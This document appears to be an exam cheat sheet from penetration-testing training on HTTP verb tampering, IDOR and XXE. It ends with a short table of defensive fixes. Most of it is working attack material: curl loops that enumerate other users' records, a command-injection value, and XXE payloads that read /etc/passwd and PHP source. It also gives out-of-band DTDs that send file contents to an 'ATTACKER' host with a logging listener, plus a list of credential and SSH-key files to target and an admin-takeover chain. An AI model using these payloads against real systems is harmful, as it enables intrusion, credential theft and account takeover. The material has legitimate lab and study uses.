# Web Attacks — Exam Cheat Sheet

Three vuln classes covered: **HTTP Verb Tampering**, **IDOR**, **XXE**. The skills assessment combines all three.

---

## HTTP Verb Tampering

### Recognition
| Pattern | Verb-tampering risk |
|---------|---------------------|
| Apache `<Limit GET POST>` (denylist) | Other verbs bypass auth |
| Apache `<LimitExcept GET POST>` (allowlist) | Safe |
| J2EE `<http-method>GET</http-method>` (per-verb) | Other verbs bypass |
| `.NET <authorization>` with `verbs="GET"` | Other verbs bypass |
| PHP validates `$_POST['x']` but acts on `$_REQUEST['x']` | Switch verb so $_POST is empty |

### Quick test
```bash
for v in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  printf "%-7s " "$v"
  curl -skI -X $v -o /dev/null -w "%{http_code}\n" "$URL/path"
done
```
Different code/size between verbs → likely tampering.

### Bypass on auth
```bash
# Apache <Limit GET POST> denying these
curl -X DELETE "$URL/admin/reset.php"
```

### Bypass on input source mismatch
```bash
# Filter on $_POST['filename'], action on $_REQUEST['filename']
curl -X POST "$URL/path" -d "filename=; cp /flag .;"

# OR with query string when validator reads $_POST
curl -X PUT "$URL/reset.php?uid=52&token=$T&password=p"
```

---

## IDOR (Insecure Direct Object Reference)

### Two flavors
| Type | Effect |
|------|--------|
| Information disclosure | Read another user's data |
| Insecure function call | Modify/delete other users' state, or call admin-only fn |

### Where to look
- Path params: `/profile/42`, `/api/user/42`
- Query params: `?id=42`, `?uid=42`
- Cookies: `Cookie: uid=42`
- Hidden form fields
- AJAX request bodies

### Mass enumeration (GET)
```bash
for i in {1..100}; do
  curl -sk "$URL/api.php/user/$i" >> /tmp/users.txt
done
```

### Mass enumeration (POST)
```bash
for i in {1..100}; do
  curl -sk -X POST -d "uid=$i" "$URL/download.php" -OJ
done
```

### Encoded references
| Encoding | Reproduce |
|----------|-----------|
| base64 | `echo -n VALUE \| base64 -w 0` |
| md5 | `echo -n VALUE \| md5sum \| tr -d ' -'` |
| md5(base64(X)) | `echo -n X \| base64 -w 0 \| md5sum \| tr -d ' -'` |
| sha256 | `echo -n VALUE \| sha256sum \| tr -d ' -'` |

ALWAYS inspect the front-end JS first — encoding scheme is visible there.

### Chain — GET IDOR → PUT IDOR
```bash
# 1. Read target's uuid/role via GET
curl -sk "$URL/api.php/user/52"
# {"uid":"52","uuid":"abc","role":"admin",...}

# 2. PUT to update target using leaked uuid
curl -sk -X PUT "$URL/api.php/user/52" \
  -H "Content-Type: application/json" \
  -d '{"uid":"52","uuid":"abc","role":"admin","email":"new@x.com"}'
```

### Token reset IDOR pattern
```
GET /api.php/token/{uid}   → leak reset token
POST /reset.php uid token   → reset password
```
If `/api.php/token/{uid}` has no session check, you reset any user.

---

## XXE (XML External Entity)

### Recognition
- `Content-Type: application/xml` or `text/xml`
- Body looks like `<root>...</root>`
- AJAX builds XML via string concat (`xmlhttp.send(xml)`)
- File uploads accepting SVG/DOCX/XLSX/EPUB (all XML internally)
- SOAP, SAML, RSS feeds

### Basic file read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<root><email>&x;</email></root>
```

### PHP source disclosure
```xml
<!DOCTYPE r [
  <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file.php">
]>
<root><email>&x;</email></root>
```
Decode response: `echo "..." | base64 -d`

### CDATA via external DTD (binary/source-safe for any language)
**xxe.dtd** (hosted on attacker):
```xml
<!ENTITY joined "%begin;%file;%end;">
```

**Payload to target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file  SYSTEM "file:///var/www/html/secret.php">
  <!ENTITY % end   "]]>">
  <!ENTITY % xxe   SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %xxe;
]>
<root><email>&joined;</email></root>
```

### Error-based (no reflection, but verbose errors)
```xml
<!-- DTD hosted on attacker -->
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExisting;/%file;'>">
%error;

<!-- payload to target -->
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %remote;
  %error;
]>
<root><email>x</email></root>
```
File content appears in the parser error message.

### Blind OOB exfiltration
**index.php** (listener — auto-decodes base64):
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Start with `php -S 0.0.0.0:8000`.

**xxe.dtd** (hosted on attacker):
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/FILE">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER:8000/?content=%file;'>">
%oob;
```

**Payload to target:**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://ATTACKER:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
File content arrives in attacker's HTTP log, base64-decoded by listener.

### XXEinjector (automation)
```bash
git clone https://github.com/enjoiz/XXEinjector.git
ruby XXEinjector.rb \
  --host=YOUR_IP --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http --phpfilter
```

### URI schemes by language
| Target | Schemes |
|--------|---------|
| PHP | file, http, php://filter (universal), expect (if loaded) |
| Java | file, http, jar, netdoc |
| .NET | file, http |
| Python | file, http (recent lxml has external entities disabled) |

---

## High-Value File Targets

```
Linux:
/etc/passwd                   ← always tries first
/etc/hosts
/etc/shadow                   ← rarely readable
/proc/self/cwd/index.php      ← read from cwd without knowing path
/proc/self/environ            ← env vars (DB creds, secrets)
/proc/self/cmdline
/home/<u>/.ssh/id_rsa
/var/www/html/.env
/etc/apache2/sites-enabled/000-default.conf  ← reveals DocumentRoot
/flag.php                     ← labs often put it at filesystem root

Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

---

## Skills Assessment Chain (Module Combiner)

```
1. Login as low-priv user
2. Find IDOR endpoint (token, profile) — enumerate to identify admin
3. Find verb-tamper or auth bypass on a write endpoint (password reset)
4. Combine: take over admin account
5. Find XML-parsing endpoint reachable only as admin (event creator, import)
6. XXE → read /flag.php via php://filter/convert.base64-encode
```

---

## Quick Decision Tree

| You have... | Try... |
|-------------|--------|
| HTTP form posting XML | XXE — start with `<!ENTITY x "test">`, then `file://` |
| HTTP form posting form data | Verb tampering — sweep methods, watch for code/size diff |
| API with `/resource/{id}` | IDOR — vary id, then test all 4 verbs |
| Encoded ID (`?id=NDI=`) | Read front-end JS for encoder, reproduce, enumerate |
| XML field reflected | Basic XXE with `file://` or `php://filter` |
| XML field NOT reflected, errors shown | Error-based XXE |
| XML field NOT reflected, no errors | OOB XXE with external DTD |
| Admin endpoint redirects | Check if admin role is in cookie (tamper) or session (escalate via IDOR) |

---

## Common Gotchas

- **lab variants differ from documentation** — always inspect the actual JS / form behavior before scripting
- **Apache `<FilesMatch ".+\.ph(ar|p|tml)">` with no `$`** lets you upload `shell.phtml.jpg`
- **echo -n + base64 -w 0** — trailing newlines change hashes/encoded values
- **`$IFS` substitutes for spaces** in `expect://` payloads
- **billion-laughs DoS is blocked** on modern parsers — don't waste time
- **Flag files often live at `/flag.php`** (filesystem root), not `/var/www/html/`
- **Server-side authZ on every endpoint** is the only real IDOR fix — encoding/UUIDs are obfuscation
- **`$_REQUEST` vs `$_POST`** — verb tampering can switch the input source

---

## Defense Quick Notes

| Attack | Primary fix |
|--------|-------------|
| Verb tampering (Apache) | Use `<LimitExcept>` (allowlist) — never `<Limit>` (denylist) |
| Verb tampering (code) | Read ONE consistent input source (`$_POST` only, not `$_REQUEST`) |
| IDOR | Server-side authZ on every method — owner_id check or RBAC |
| IDOR enumeration | UUID v4 references — but ONLY as defense in depth |
| XXE | Disable external entities in parser config (lib default in modern versions) |
| Error-based XXE | Disable verbose errors in production |
| Blind XXE | Egress filtering on app tier |
